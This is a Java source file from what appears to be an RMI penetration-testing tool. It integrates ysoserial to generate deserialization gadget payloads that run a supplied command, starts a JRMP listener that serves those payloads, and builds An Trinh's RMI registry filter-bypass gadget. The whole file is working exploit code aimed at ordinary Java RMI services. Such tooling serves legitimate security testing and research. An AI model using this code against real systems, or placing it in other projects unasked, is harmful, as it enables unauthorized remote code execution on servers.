package de.qtc.rmg.utils;

import java.io.File;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.NetworkInterface;
import java.net.ServerSocket;
import java.net.SocketException;
import java.net.URL;
import java.net.URLClassLoader;
import java.net.UnknownHostException;
import java.rmi.server.ObjID;
import java.rmi.server.RMIClientSocketFactory;
import java.rmi.server.RMIServerSocketFactory;
import java.rmi.server.RemoteObjectInvocationHandler;
import java.rmi.server.UnicastRemoteObject;
import java.util.Arrays;

import javax.net.ServerSocketFactory;

import de.qtc.rmg.internal.ExceptionHandler;
import de.qtc.rmg.io.Logger;
import de.qtc.rmg.networking.DummySocketFactory;
import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;

@SuppressWarnings("restriction")
public class YsoIntegration {

    private static String[] bypassGadgets = new String[]{"JRMPClient2", "AnTrinh"};

    private static Object generateBypassGadget(String command)
    {
        Object payloadObject = null;
        String[] split = command.split(":");

        if(split.length != 2 || !split[1].matches("\\d+")) {
            ExceptionHandler.invalidListenerFormat(true);
        }

        try {
            payloadObject = prepareAnTrinhGadget(split[0], Integer.valueOf(split[1]));
        } catch (Exception e) {
            ExceptionHandler.unexpectedException(e, "bypass object", "generation", true);
        }

        return payloadObject;
    }

    private static URLClassLoader getClassLoader(String ysoPath) throws MalformedURLException
    {
        File ysoJar = new File(ysoPath);

        if( !ysoJar.exists() ) {
            ExceptionHandler.internalError("RMGUtils.createListener", "Error: " + ysoJar.getAbsolutePath() + " does not exist.");
        }

        return new URLClassLoader(new URL[] {ysoJar.toURI().toURL()});
    }

    private static InetAddress getLocalAddress(String host)
    {

        InetAddress addr = null;

        try {
            addr = InetAddress.getByName(host);
            if (!addr.isAnyLocalAddress() && !addr.isLoopbackAddress())
                NetworkInterface.getByInetAddress(addr);

        } catch (SocketException | UnknownHostException e) {
            Logger.eprintlnMixedYellow("Specified address", host, "seems not to be available on your host.");
            Logger.eprintlnMixedBlue("Listener address is expected to be", "bound locally.");
            ExceptionHandler.showStackTrace(e);
            RMGUtils.exit();
        }

        return addr;
    }

    public static void createJRMPListener(String ysoPath, String host, int port, String gadget, String command)
    {
        try {
            InetAddress bindAddress = getLocalAddress(host);
            URLClassLoader ucl = getClassLoader(ysoPath);

            Class<?> yso = Class.forName("ysoserial.exploit.JRMPListener", true, ucl);
            Constructor<?> cons = yso.getConstructor(new Class[] {int.class, Object.class});
            Method runMethod = yso.getDeclaredMethod("run", new Class[] {});

            Field serverSocket = yso.getDeclaredField("ss");
            serverSocket.setAccessible(true);

            Logger.printMixedYellow("Creating a", "JRMPListener", "on ");
            Logger.printlnPlainBlue(host + ":" + port + ".");

            Object payloadObject = getPayloadObject(ysoPath, gadget, command);
            Object jrmpListener = cons.newInstance(port, payloadObject);

            ServerSocket serverSock = (ServerSocket) serverSocket.get(jrmpListener);
            serverSock.close();

            serverSock = ServerSocketFactory.getDefault().createServerSocket(port, 0, bindAddress);
            serverSocket.set(jrmpListener, serverSock);

            Logger.printlnMixedBlue("Handing off to", "ysoserial...");

            runMethod.invoke(jrmpListener, new Object[] {});
            System.exit(0);

        } catch( Exception e ) {
            ExceptionHandler.unexpectedException(e, "JRMPListener", "creation", true);
        }
    }

    public static Object getPayloadObject(String ysoPath, String gadget, String command)
    {
        if(Arrays.asList(bypassGadgets).contains(gadget)) {
            return generateBypassGadget(command);
        }

        Object ysoPayload = null;

        try {
            URLClassLoader ucl = getClassLoader(ysoPath);

            Class<?> yso = Class.forName("ysoserial.payloads.ObjectPayload$Utils", true, ucl);
            Method method = yso.getDeclaredMethod("makePayloadObject", new Class[] {String.class, String.class});

            Logger.print("Creating ysoserial payload...");
            ysoPayload = method.invoke(null, new Object[] {gadget, command});

        } catch( Exception  e) {
            Logger.printlnPlain(" failed.");
            Logger.eprintlnMixedYellow("Caught unexpected", e.getClass().getName(), "during gadget generation.");
            Logger.eprintMixedBlue("You probably specified", "a wrong gadget name", "or an ");
            Logger.printlnPlainBlue("invalid gadget argument.");
            ExceptionHandler.showStackTrace(e);
            RMGUtils.exit();
        }

        Logger.printlnPlain(" done.");
        return ysoPayload;
    }


    /*
    * The bypass technique implemented by this code was discovered by An Trinh (@_tint0) and a detailed analysis was
    * provided by Hans-Martin Münch (@h0ng10). Certain portions of the code were copied from the corresponding blog post:
    * https://mogwailabs.de/de/blog/2020/02/an-trinhs-rmi-registry-bypass/
    *
    * @param host  listener address for the outgoing JRMP connection
    * @param port  listener port for the outgoing JRMP connection
    * @param regMethod  registry Method to use for the call
    */
    public static Object prepareAnTrinhGadget(String host, int port) throws Exception
    {
        Constructor<UnicastRemoteObject> constructor = UnicastRemoteObject.class.getDeclaredConstructor(int.class, RMIClientSocketFactory.class, RMIServerSocketFactory.class);
        constructor.setAccessible(true);

        Field ssfField = UnicastRemoteObject.class.getDeclaredField("ssf");
        ssfField.setAccessible(true);

        TCPEndpoint endpoint = new TCPEndpoint(host, port);
        UnicastRef refObject = new UnicastRef(new LiveRef(new ObjID(123), endpoint, false));

        RemoteObjectInvocationHandler payloadInvocationHandler = new RemoteObjectInvocationHandler(refObject);
        RMIServerSocketFactory proxySSF = (RMIServerSocketFactory) Proxy.newProxyInstance(
            RMIServerSocketFactory.class.getClassLoader(),
            new Class[] { RMIServerSocketFactory.class, java.rmi.Remote.class },
            payloadInvocationHandler);

        UnicastRemoteObject payloadObject = null;
        payloadObject = (UnicastRemoteObject)constructor.newInstance(new Object[]{0, null, new DummySocketFactory()});
        UnicastRemoteObject.unexportObject(payloadObject, true);

        ssfField.set(payloadObject, proxySSF);
        return payloadObject;
    }
}
